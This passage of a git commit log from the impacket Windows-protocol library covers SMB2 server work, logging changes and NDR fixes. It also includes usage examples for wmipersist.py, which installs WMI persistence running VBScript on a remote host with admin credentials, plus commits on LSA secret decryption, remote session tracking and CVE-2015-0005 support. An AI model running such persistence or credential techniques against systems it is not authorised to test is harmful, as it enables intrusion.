    We're taking care of that situation when acting as a SMB1 server.

commit fa63f520abc550811169d3a29183bdde31cf8acb
Author: asolino <bethus@gmail.com>
Date:   Thu Jun 4 10:21:07 2015 -0300

    Fixed issue https://github.com/CoreSecurity/impacket/issues/67. Thanks @MrTchuss

commit 1994a5c7626fb655bfdaaf328d13a813a42d23b5
Author: asolino <bethus@gmail.com>
Date:   Wed Jun 3 21:22:19 2015 -0300

    Code cleanup / switching to @staticmethod when suitable

commit b1eb2723646fd68c98d338dade72b9f3a7e9a5a5
Author: asolino <bethus@gmail.com>
Date:   Tue Jun 2 16:21:24 2015 -0300

    Fixing typos and indentation errors

commit 39fde4705c9eb77d9df6ac8123d08cf680a87661
Author: asolino <bethus@gmail.com>
Date:   Sat May 30 14:01:06 2015 -0300

    Fixes https://github.com/CoreSecurity/impacket/issues/66 reported by deniskhodus.
    
    We're now testing the `securityBindings` buffer is at least a two bytes long.
    This shouldn't happen in theory, but maybe there are a few remaining bytes
    left (probably padding bytes) in the last round of that loop.
    
    Maybe we should also check if there could be 3 or more bytes left on that buffer,
    but not long enough to fulfill a `SECURITYBINDING` structure.
    If so, then there will be an exception trying to build a `SECURITYBINDING`
    struct. However that error hasn't been reported.

commit 1bec6c9126705c27706c6a9cfffb10a49e782319
Merge: 8ab20793 6a88eb07
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri May 29 10:22:00 2015 -0300

    Merge pull request #64 from lgriner/master
    
    update setup.py: merging change from lgriner, thanks!

commit 6a88eb0720b659056855ecaac76c8b0a1a293c08
Author: Tyrannosaurus Vexed <leegriner@gmail.com>
Date:   Fri May 29 08:30:56 2015 -0400

    update setup.py
    
    typo in the shebang line

commit 8ab20793a00db9c64bbf90d3812d108b9d1ddcbf
Merge: 138b9a16 6085a1a2
Author: asolino <bethus@gmail.com>
Date:   Thu May 28 14:21:34 2015 -0300

    Merge branch 'master' of https://github.com/CoreSecurity/impacket

commit 138b9a16390d5f2d655f119b8ac0362e052bdabf
Author: asolino <bethus@gmail.com>
Date:   Thu May 28 14:10:20 2015 -0300

    Fixes NDRUNION unpacking inside a pointer to an array of union elements
    
    An example of such scenario is [MS-DHCPE], `R_DhcpEnumSubnetElementsV4` call
    (section 3.1.4.31).
    The returned element is a `LPDHCP_SUBNET_ELEMENT_INFO_ARRAY_V4`:
    ```
    typedef struct _DHCP_SUBNET_ELEMENT_INFO_ARRAY_V4 {
      DWORD NumElements;
    [size_is(NumElements)] LPDHCP_SUBNET_ELEMENT_DATA_V4 Elements;
    } DHCP_SUBNET_ELEMENT_INFO_ARRAY_V4,
    *LPDHCP_SUBNET_ELEMENT_INFO_ARRAY_V4;
    ```
    each element of that array is a union like this:
    ```
    && (DhcpIpRangesDhcpOnly <= (E)))?(0):(E))
    typedef struct _DHCP_SUBNET_ELEMENT_DATA_V4 {
      DHCP_SUBNET_ELEMENT_TYPE ElementType;
      [switch_is(ELEMENT_MASK(ElementType)), switch_type(DHCP_SUBNET_ELEMENT_TYPE)]
      union _DHCP_SUBNET_ELEMENT_UNION_V4 {
        [case(DhcpIpRanges)]
        DHCP_IP_RANGE* IpRange; [case(DhcpSecondaryHosts)]
        DHCP_HOST_INFO* SecondaryHost; [case(DhcpReservedIps)]
        DHCP_IP_RESERVATION_V4* ReservedIp; [case(DhcpExcludedIpRanges)]
        DHCP_IP_RANGE* ExcludeIpRange; [case(DhcpIpUsedClusters)]
        DHCP_IP_CLUSTER* IpUsedCluster;
      } Element;
    } DHCP_SUBNET_ELEMENT_DATA_V4, *LPDHCP_SUBNET_ELEMENT_DATA_V4;
    ```
    
    Trying to decode a structure like this would trigger an error.
    
    Main problem was the NDRUNION constructor was interpreting all the
    pointers inside the structure as NDR top level pointers, which is
    not always true (only true if UNION belongs to the NDRCALL directly).
    
    Changing this behaviour seems to fix this issue while mantaining
    the rest of the test cases working. More test is needed tho.

commit 6085a1a2a52a7247c1e9822d2abb66d6f3c81cb5
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed May 27 15:14:49 2015 -0300

    Update README.md

commit 9471616548bb6845c6e4a71ef174ec4f24b9c6e2
Merge: 6ef8ae60 e8253a62
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed May 27 12:27:41 2015 -0300

    Merge pull request #63 from CoolOppo/patch-1
    
    Syntax highlighting and copy-edited README, thanks mate!

commit e8253a62c78b1850ce91d7b8cd17b9c28a7abd0d
Author: CoolOppo <CoolOppo@users.noreply.github.com>
Date:   Tue May 26 21:53:47 2015 -0400

    Rename README to README.md
    
    This enables syntax-highlighting on GitHub.

commit 6a130cc05d4059efe87b55b6ad0aefa02547bcb6
Author: CoolOppo <CoolOppo@users.noreply.github.com>
Date:   Tue May 26 21:52:36 2015 -0400

    Syntax highlighting and copy-edited README

commit 6ef8ae60bb2d436175b0c125b8ab1abd2e1c6ca5
Author: asolino <bethus@gmail.com>
Date:   Tue May 26 19:41:31 2015 -0300

    Replacing decode('hex')/encode('hex')
    
    for binascii's hexlify/unhexlify, mainly because of http://bugs.python.org/issue7475
    and Python3 not having it.

commit 4e32a0d4983d7480e5fa94546ffbe5fc83ca88a0
Author: asolino <bethus@gmail.com>
Date:   Mon May 25 20:40:17 2015 -0300

    Removing some pyCharm's erros/warnings
    
    More scripts/libs changed. Hopefully doesn't break a thing. Test cases are passing

commit 0fc523de873f9f2085d90533d428a4f156a6d422
Author: asolino <bethus@gmail.com>
Date:   Mon May 25 20:37:57 2015 -0300

    The examples theme won't be applied if the init() function isn't called.
    
    In short, in every example you should do:
    import logging
    from impacket.examples import logger
    
    and later in main()
    
        # Init the example's logger theme
        logger.init()
    
    then you can write to the logger using:
    logging.info()
    logging.warning(),
    etc.

commit 0785c5afd30a23d6c622823d31f4391c18eb7e46
Author: asolino <bethus@gmail.com>
Date:   Sat May 23 18:31:08 2015 -0300

    Removing some pyCharm's erros/warnings
    
    Hopefully doesn't break a thing. Test cases are passing

commit dbcacbfaf12bba537f13330cf111cecb68b42da7
Author: asolino <bethus@gmail.com>
Date:   Sat May 23 17:23:36 2015 -0300

    Fixes https://github.com/CoreSecurity/impacket/issues/62
    
    Error on import cause by https://github.com/CoreSecurity/impacket/commit/8b8f8a694703858b217117cffad83c6a61b38065.
    Hopefully it's the only one.

commit 8b8f8a694703858b217117cffad83c6a61b38065
Author: asolino <bethus@gmail.com>
Date:   Sat May 23 11:56:59 2015 -0300

    Pyton imports fixups
    
    1) Removed unnecesary imports, avoid import * whenever possible
    2) Copyright updated
    3) Minor typos fixed
    4) File formats to Unix (LF)

commit b4f2d768f75b1836fca1452d8ed9dce349228917
Author: asolino <bethus@gmail.com>
Date:   Fri May 8 16:39:12 2015 -0300

    Changed unsupported mech type behaviour.
    
    If SMB client wants to do Kerberos or something we don't support, now we answer
    STATUS_MORE_PROCESSING_REQUIRED specifying the NTLM MechType again. Seems that's
    the right way to do it instead of answering STATUS_NOT_SUPPORTED.

commit 9c980a7304a423c8849d035db13badd28cc4fade
Author: asolino <bethus@gmail.com>
Date:   Tue May 5 19:07:39 2015 -0300

    Fix some typos

commit c6a6790c55b0b5e1b24eb136e07b971d165d438e
Author: asolino <bethus@gmail.com>
Date:   Mon May 4 14:11:04 2015 -0300

    New dev release...

commit 02b4ab82708bfefaa638e92d15aad5998026210c
Author: asolino <bethus@gmail.com>
Date:   Mon May 4 12:18:43 2015 -0300

    Changing version also at setup.py

commit 60a0c5b126a8a42121852de7ef5354beb8e631e3
Author: asolino <bethus@gmail.com>
Date:   Mon May 4 11:59:25 2015 -0300

    Adding Changelog and changing dev version to final.

commit a3b11bcef0c0ead6b7d844e0b2b94656453f58db
Author: asolino <bethus@gmail.com>
Date:   Sun May 3 22:23:18 2015 -0300

    Some corrections to make these tests to pass

commit 535a44f69b68062218b2dced82456ec93562f1a4
Author: asolino <bethus@gmail.com>
Date:   Sun May 3 22:01:59 2015 -0300

    Some corrections to make these tests to pass

commit 6fc56f05b9867db72f8e0ef32e888e883c924bf0
Author: asolino <bethus@gmail.com>
Date:   Fri May 1 18:53:22 2015 -0300

    `psexec.py` now defaults to executing cmd.exe if no command is specified
    
    I don't know why I didn't do this before but more than one of you
    fell on that little detail.
    There might be a reson tho :s.. testing needed!

commit 8a96b280c92020e8fafc034646f72ce515b81346
Author: asolino <bethus@gmail.com>
Date:   Fri May 1 16:43:24 2015 -0300

    Removing these files. Outdated

commit 9c85ee047a8be00ae22858b43bd13516a261e18a
Author: asolino <bethus@gmail.com>
Date:   Fri May 1 13:31:32 2015 -0300

    No need to encode the serviceName. It fails on some XP versions
    
    This was left from the old RPC runtime where we had to manually encode things.
    Now it's all handled by ndr.py

commit 352816b37f01e9d6240cc21753eb9336644e6199
Author: asolino <bethus@gmail.com>
Date:   Thu Apr 30 18:05:37 2015 -0300

    Adding log level message format and adding try/catch to fail gracefully
    
    Small fixes. Almost ready to tag new version

commit 925aa52c1640be19657f117ad9fb4534e9b16210
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 29 10:26:27 2015 -0300

    Added `from __future__ import with_statement` for older Python versions

commit 3f0585a2b832815daeeb03de5af9356fd2d81244
Author: asolino <bethus@gmail.com>
Date:   Tue Apr 28 16:12:07 2015 -0300

    SMB2_QUERY_DIRECTORY and SMB.TRANS.FIND_FIRST2 information levels updated
    
    Plus now it returns STATUS_NOT_SUPPORTED (only in SMB2) if the level
    is not present.

commit 34a490e2a694c2636e2f83ef439aacc3129b2b51
Author: asolino <bethus@gmail.com>
Date:   Tue Apr 28 11:12:41 2015 -0300

    SRVSServer.NetrShareGetInfo() fix when non existent share was sent.
    
    The SMBServer has a mini DCERPC server serving a minimal subset of
    [MS-SRVS] calls used by clients.
    The NetrShareGetInfo() method was assuming the share asked for
    information was always existing, something that could not be true.
    Calling, from the client, 'start \\smbserver\SHARE', and SHARE being
    non existant was triggering this problem.
    Now if the share doesn't exist the method returns WEE_NET_NAME_NOT_FOUND.

commit fde21c2b810db4efbdcb75ab7593664872677e4b
Author: asolino <bethus@gmail.com>
Date:   Mon Apr 27 22:41:35 2015 -0300

    SPNEGO MechType check
    
    We now check the selected MechType is for NTLM auth. If not, we fail gracefully with STATUS_NOT_SUPPORTED

commit 816a950b2a94e66596fd1396cdf4ee9f6b6b0442
Author: asolino <bethus@gmail.com>
Date:   Mon Apr 27 21:13:17 2015 -0300

    Updates to SMB2 Server
    
    1) We need to store the new filename inside the connData['OpenedFiles'] dictionary
    when renaming a file
    2) SMB2Lock wasn't unpacking correctly, producing an error.
    
    BTW, OSx SMB client implementation sucks.

commit 53306c9c8926cc67ebeb620dd27701ee85d4a80e
Author: asolino <bethus@gmail.com>
Date:   Mon Apr 27 20:11:56 2015 -0300

    Updates to SMB2 Server
    
    1) Dummy SMB2_LOCK, SMB2_CANCEL added
    2) SMB2_FLUSH added
    3) SMB2_FILE_INTERNAL_INFO level added
    4) Getting fileID from previous compound request for all functions that apply
    5) Fixed path calculation when renaming a file outside the root tree dir
    
    Looks like it's working OK from Linux/Windows and OSX (guest login)

commit 94b141881bc076303ff6b7e635a807b37851b163
Author: asolino <bethus@gmail.com>
Date:   Sat Apr 25 16:58:36 2015 -0300

    Added SMBSERVER() support for renaming files/folders through SMB2_SET_INFO.
    
    This is what explorer uses when renaming files/folders.

commit 4c2e64ad3add7e40609834a7a8f046ca86304e56
Author: asolino <bethus@gmail.com>
Date:   Fri Apr 24 18:42:12 2015 -0300

    Second round of logging change.
    Now there should be a single logger called 'impacket' the library uses.
    By default is has a NullHandler so nothing is printed, but messages are
    forwarded to the upstream logger.
    
    If you are a script using the library and want to set the root logger
    with a custom formatter, you can import impacket.examples.logger.
    
    After some testing I'll merge it into master

commit 7e99da87f92244fce5caa659bb122dfe2c4f4991
Author: asolino <bethus@gmail.com>
Date:   Fri Apr 24 13:18:26 2015 -0300

    Adding debug parameter

commit 119e4438dd8227a138d5ecc2052646c3a81b9e4e
Author: asolino <bethus@gmail.com>
Date:   Fri Apr 24 12:52:32 2015 -0300

    Changing logging mechanisms everywhere.
    Full details coming soon

commit 0730a3428af8bd1625a205420dbdc5e2af892bda
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 22 14:58:06 2015 -0300

        Playing with logging, trying to get to something useful to finally have a decent logging inside impacket.
    
        1) We basically define a logger called 'impacket' at the library's __init__, set out a NullHandler for it, and
    
        2) All the logging stuff in version.py removed
    
        With this we have a single logger called 'impacket' for the library.
    
        Now.. what about the example scripts?
    
        1) Move the impacket/logger.py to impacket/examples/logger.py, since this is something that is used just by the
    
        2) Example scripts should import that file in order for the library logs to be shown right (from impacket.examp
    
        For third-party developers that want to disable or change the logs generated by the library:
    
        1) They could, inside the scripts, logging.getLogger('impacket').disabled = True, or add handlers, or whatever.
    
        Testing needed..

commit c2b47d34365d81c8d7de1e445da3999ea2e8a342
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 22 14:49:19 2015 -0300

    Playing with logging, trying to get to something useful to finally have a decent logging inside impacket.
    
    1) We basically define a logger called 'impacket' at the library's __init__, set out a NullHandler for it, and assign a global variable LOG that will need to be imported from all the library modules. From now on, ALL library modules LOG through that variable. All modules should have 'from impacket import LOG'
    
    2) All the logging stuff in version.py removed
    
    With this we have a single logger called 'impacket' for the library.
    
    Now.. what about the example scripts?
    
    1) Move the impacket/logger.py to impacket/examples/logger.py, since this is something that is used just by the example modules (yeah, shouldn't be inside the library itself, but oh well). Inside logger.py, we modify the root logger and change the format of the messages (as set by @lanjelot). The root logger is held in a global variable called SLOG (scripts log?.. another ideas welcomed).
    
    2) Example scripts should import that file in order for the library logs to be shown right (from impacket.examples.logger import SLOG). Plus if they want to log themselves, they can use SLOG.
    
    For third-party developers that want to disable or change the logs generated by the library:
    
    1) They could, inside the scripts, logging.getLogger('impacket').disabled = True, or add handlers, or whatever.
    
    Testing needed..

commit 10c54429c22e0277934108b520684b24f3f60bc7
Author: asolino <bethus@gmail.com>
Date:   Fri Apr 24 12:55:35 2015 -0300

    Fix SMBSERVER error when no challenge was set in config file.
    
    https://github.com/CoreSecurity/impacket/pull/57 added option for setting
    a custom challenge in SimpleSMBServer class. However, those modules that
    would instantiate an SMBSERVER directly (e.g. karmaSMB) would fail if the
    challenge option wasn't set.
    I've added a the default challenge to be 'A'*8 at the SMBSERVER class level.

commit 8b359e16252c59caec093e13cd76e906fd6f5c0f
Merge: dc1b6487 3352733f
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Apr 22 09:23:11 2015 -0300

    Merge pull request #57 from byt3bl33d3r/master
    
    Added option to set custom SMB challenge in smbserver.py

commit 3352733f434bff1f929f3bcc5135bdab9a769f60
Author: byt3bl33d3r <byt3bl33d3r@gmail.com>
Date:   Wed Apr 22 07:38:36 2015 +0200

    added missing )

commit 4a54672034cc9a8ae1dec124d803292b6b6b67a9
Author: byt3bl33d3r <byt3bl33d3r@gmail.com>
Date:   Wed Apr 22 07:37:11 2015 +0200

    modified comment

commit 028dcdb90cdcd78747d47a94ecdca86546e97867
Author: byt3bl33d3r <byt3bl33d3r@gmail.com>
Date:   Tue Apr 21 23:50:33 2015 +0200

    have no idea what i was thinking at the time

commit 9c7b50e34f5276332e632d5534da0a852b21e887
Author: byt3bl33d3r <byt3bl33d3r@gmail.com>
Date:   Tue Apr 21 22:45:51 2015 +0200

    corrected a comment

commit 7d532eef967666b4e11024efd7a74a12e809303a
Author: byt3bl33d3r <byt3bl33d3r@gmail.com>
Date:   Tue Apr 21 22:27:36 2015 +0200

    removed debug print statements

commit 73fdb533dd2835c2996e4d392384bde053a459c2
Author: byt3bl33d3r <byt3bl33d3r@gmail.com>
Date:   Tue Apr 21 22:25:40 2015 +0200

    added option to set smb challenge in smbserver.py

commit dc1b6487edb3a35284ce50ea6a9c47bd55aad69b
Author: asolino <bethus@gmail.com>
Date:   Tue Apr 21 12:57:10 2015 -0300

    Adding SMB2 support for karmaSMB
    
       The SMB2 support works with a caveat. If two different
       filenames at the same share are requested, the first
       one will work and the second one will not work if the request
       is performed right away. This seems related to the
       QUERY_DIRECTORY request, where we return the files available.
       In the first try, we return the file that was asked to open.
       In the second try, the client will NOT ask for another
       QUERY_DIRECTORY but will use the cached one. This time the new file
       is not there, so the client assumes it doesn't exist.
       After a few seconds, looks like the client cache is cleared and
       the operation works again. Further research is needed trying
       to avoid this from happening.

commit 809b2c89208d204bc6daf68500afebc665a33548
Merge: e9614738 c7d1786b
Author: asolino <bethus@gmail.com>
Date:   Mon Apr 20 21:02:06 2015 -0300

    Merge branch 'master' of https://github.com/CoreSecurity/impacket

commit e96147381b170b701a2f82203214a3392ed88358
Author: asolino <bethus@gmail.com>
Date:   Mon Apr 20 20:57:57 2015 -0300

    Adding initial support for SMB2 (SMB 2.002) dialect. If not explicitly specified, it should all work still the same (SMB1).
    It can be tested running the smbserver.py example with the -smb2support parameter. Looks like it's working from
    Windows clients and Samba clients (Samba 4.2.x).
    A lot of testing needed!

commit c7d1786bc27f92186b41bafdd85bcd5cccdd783a
Author: asolino <bethus@gmail.com>
Date:   Fri Apr 17 15:35:10 2015 -0300

    Updated README

commit f0cf1be7b4ee64f0f3cd65d27df6af998d6e4b26
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 15 13:26:25 2015 -0300

    Replacing google.code links for github

commit 91763930805347767590d750d2a7681cd4b2861d
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 15 13:17:34 2015 -0300

    Replacing google.code links

commit a186ff111d68237ef46e81ecaf83f85fed5e0aa4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Apr 14 16:56:25 2015 +0000

    Adding S4U2Self structures

commit 8ab5bffc9487c129a217df47d78240da87100924
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Apr 10 21:13:17 2015 +0000

    Adding keytype. Not documented by MSFT, but it's clearly the NTHASH
    0xffffff74:'rc4_hmac'

commit 4d6b5cebb82dbb6c7694ccea4616c3b43debd244
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Apr 10 21:01:52 2015 +0000

    If we don't know the KeyType's string name, we just put its number

commit 04fd08a4a4269286b33a97dad97983350bc4b6e6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Apr 10 19:53:09 2015 +0000

    Fixed a typo and clarified the examples

commit 1f377339ff4a00ae0b3ae923a812b3e7c5c19af6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Apr 10 19:00:37 2015 +0000

    Adding -target-ip switch in case you cannot resolve it

commit 2961a45867f97529b8099647a72b93b85df7d1d9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Apr 10 18:20:13 2015 +0000

    More checks to verify the target ETYPE is supported. The domain controller functional level might be another situation that can trigger AES not supported

commit c444e653f59720fbb2ebb3fec0ad37c352be3528
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Apr 10 17:53:37 2015 +0000

    More checks to verify the target ETYPE is supported. This could be triggered on a Windows 2008 R2 SP1 (SP0 accepts AES).

commit 0c4fe32fb1969d3cf9fc1af5dac3612dff817b30
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 9 20:50:13 2015 +0000

    Synchronizing with impact's internal repo

commit a46cad19552a4fe72dfab31ba2dcbb6f1fb6f1ae
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 9 19:19:47 2015 +0000

    Adding more checks in case we get a KDC_ERR_ETYPE_NOSUPP error. We try to switch to RC4 and hope for the best

commit e78a860d38be3744b04aba7646ed0862b207d029
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 8 17:50:10 2015 +0000

    Updated description:
    
    # This script creates/removes a WMI Event Consumer/Filter and link
    # between both to execute Visual Basic based on the WQL filter
    # or timer specified.
    #
    # Author:
    #  beto (@agsolino)
    #
    # Example:
    #
    # write a file toexec.vbs the following:
    #       Dim objFS, objFile
    #       Set objFS = CreateObject("Scripting.FileSystemObject")
    #       Set objFile = objFS.OpenTextFile("C:\ASEC.log", 8, true)
    #       objFile.WriteLine "Hey There!"
    #       objFile.Close
    #
    #
    # then excute this script this way, VBS will be triggered once
    # somebody opens calc.exe:
    #
    #  wmipersist.py domain.net/adminuser:mypwd@targetHost install -name ASEC
    #   -vbs toexec.vbs
    #   -filter 'SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance
    #            ISA "Win32_Process" AND TargetInstance.Name = "calc.exe"'
    #
    # or, if you just want to execute the VBS every XXX milliseconds:
    #
    #  wmipersist.py domain.net/adminuser:mypwd@targetHost install -name ASEC
    #   -vbs toexec.vbs -timer XXX
    #
    # to remove the event:
    #       wmipersist.py domain.net/adminuser:mypwd@targetHost remove -name ASEC
    #
    # if you don't specify the password, it will be asked by the script.
    # domain is optional.
    #

commit 29ef8f394a3e340ca318d64bbee1f5dd5f8420d9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 8 17:45:34 2015 +0000

    Clarifications on the scope of the script

commit f4819fa9ba38c355d863838ec0b1ce9c29673242
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Apr 7 13:25:11 2015 +0000

     This script creates/removes a WMI Event Consumer/Filter and link
     between both to execute Visual Basic based on the WQL filter specified.
    
     Example:
    
     write a file toexec.vbs the following:
            Dim objFS, objFile
            Set objFS = CreateObject("Scripting.FileSystemObject")
            Set objFile = objFS.OpenTextFile("C:\ASEC.log", 8, true)
            objFile.WriteLine "Hey There!"
            objFile.Close
    
    
     then excute this script this way, VBS will be triggered once
     somebody opens calc.exe:
    
      wmipersist.py domain.net/normaluser:mypwd@domain-dc install -name ASEC
       -vbs toexec.vbs
       -filter 'SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance
                ISA "Win32_Process" AND TargetInstance.Name = "calc.exe"'
    
     or, if you just want to execute the VBS every XXX milliseconds:
    
      wmipersist.py domain.net/normaluser:mypwd@domain-dc install -name ASEC
       -vbs toexec.vbs -timer XXX
    
     to remove the event:
            wmipersist.py domain.net/normaluser:mypwd@domain-dc remove -name ASEC

commit 82ec2f4f0d436626304416fb6efc3173a071f538
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Apr 6 15:42:42 2015 +0000

       The idea of this script is to get a list of the sessions
       opened at the remote hosts and keep track of them.
       Coincidentally @mubix did something similar a few years
       ago so credit goes to him (and the script's name ;)).
       Check it out at https://github.com/mubix/netview
       The main difference with our approach is we keep
       looping over the hosts found and keep track of who logged
       in/out from remote servers. Plus, we keep the connections
       with the target systems and just send a few DCE-RPC packets.
    
       One VERY IMPORTANT thing is:
    
       YOU HAVE TO BE ABLE TO RESOLV THE DOMAIN MACHINES NETBIOS
       NAMES. That's usually solved by setting your DNS to the
       domain DNS (and the right search domain).
    
       Some examples of usage are:
    
       netview.py -target 192.168.1.10 beto
    
       This will show the sessions on 192.168.1.10 and will authenticate as 'beto'
       (password will be prompted)
    
       netview.py FREEFLY.NET/beto
    
       This will download all machines from FREEFLY.NET, authenticated as 'beto'
       and will gather the session information for those machines that appear
       to be up. There is a background thread checking aliveness of the targets
       at all times.
    
       netview.py -users /tmp/users -domainController freefly-dc.freefly.net -k FREEFLY.NET/beto
    
       This will download all machines from FREEFLY.NET, authenticating using
       Kerberos (that's why domainController parameter is needed), and filter
       the output based on the list of users specified in /tmp/users file.

commit 56727f344501fd4091aab1adf60dafef2c43f055
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 1 21:40:02 2015 +0000

    Adding pyasn1 as requirement

commit 0df6b23153648f24768c79e1dbc7b96a6c2e4c94
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 1 17:45:22 2015 +0000

    Fixed wrong definition for LPDWORD

commit 7c3ca072b5de80606edf753ac9eaec533f71780b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 1 17:18:28 2015 +0000

    Synchronizing with impact's internal repo

commit 03cfbd23f1681ed5354def0a1d7fc28e9717b94b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 1 17:04:23 2015 +0000

    Changing padding from 8 to 4, seems to be effective when using RPC_C_AUTHN_LEVEL_PKT_INTEGRITY and RPC_C_AUTHN_GSS_NEGOTIATE

commit 50b59ffcdf56e6ba88f77bafe40af096287e4b83
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Mar 26 21:52:00 2015 +0000

    We're just showing that CCache file was used if debugging output is chosen. Hope it doesn't confuse ppl, but it's kind of annoying to get those messages all the time.

commit ff6a318df35004db8e4efcfc1bda7e49f3f118b6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Mar 26 21:15:50 2015 +0000

    Adding -debug flag

commit 957ab8586419b7884e4ba5acf5f002e34cbc2de0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 24 22:29:29 2015 +0000

    Changed the who command so you can list the active sessions w/o the need of being Administrator. The whole trick was to use a different information level

commit 25188dad4ba894cf80061f794c96a0247cf32e92
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 20 19:46:52 2015 +0000

    Fixes kerberosLogin calling way

commit a4f6260676492ea196d675c1440d623e6404bf0d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 20 19:28:20 2015 +0000

    Typo

commit d5238f0817ca144f2a3f0074835ce94677c8dca6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 20 19:25:53 2015 +0000

    Adding small description when calling the scripts w/no arguments

commit 5a2a246f3da8d7d4d5977a10078dd3639a9489b0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 20 19:21:09 2015 +0000

    Adding TGT, TGS when receiving get_credentials() data

commit a64365dcba4b1ac8a0092616219406e1480790a5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Mar 19 22:19:30 2015 +0000

    getCredentials() now returns more data

commit 0fcf9d3780e570e99a3bb1ed6001aca50acfed68
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Mar 19 22:18:08 2015 +0000

    This changeset allows passing TGT/TGS tickets to the DCERPC runtime. Check krb5/ccache.py toTGT()/toTGS() methods to see what the expected format must be.
    Main changes were adding TGT/TGS to the getCredentials()/get_credentials() and set_credentials() methods in the smb*/dcerpc/rpcrt/dcomrt/transport* files.
    Testing needed!

commit 192ab359b4c84c9043588109583d2952f9882b87
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Mar 18 19:56:53 2015 +0000

    Adding the following types:
    LONG64, WORD, OBJECT_TYPE_LIST

commit 185bdbbb49875a7157d10bae67afac59818e50fb
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 17 14:30:21 2015 +0000

    We extract the domain name from the authenticateMessage instead of the command line. This will increase the chances of success since request['LogonInformation']['LogonNetworkTransitive']['Identity']['LogonDomainName'] must match the authenticate['domain_name'] field.

commit 872c656a74d0c61fb2b2b6ed80ca9224ba31d663
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 17 12:54:34 2015 +0000

    Fixed a bug that would cause DCOMConnection.PINGTIMER to be set to None when there were already active connections.

commit 734fa44b90cbf4cea6c7824fb84a08626adab8c4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Mar 16 16:45:07 2015 +0000

    removed traceback prints

commit 5ca4e2278008b1ceaa8f47eaf8a504cf3b455cfb
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 13 05:40:10 2015 +0000

    Fixes LSA Secrets decryption on NT5 x64 systems as described by Sebastien Macke at https://www.trustwave.com/Resources/SpiderLabs-Blog/Dumping-LSA-Secrets-on-NT5-x64

commit 7f041090f35004022b4e5cb8ea0b34e13fa96b60
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 10 17:06:06 2015 +0000

    Adding support for CVE-2015-0005

commit f79acb0a3928ce76cab104815b241a47f926e054
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 10 17:01:55 2015 +0000

    Adding support for CVE-2015-0005

commit 84568806cb9e18d71647341a8b4b36ff3b4a24c6
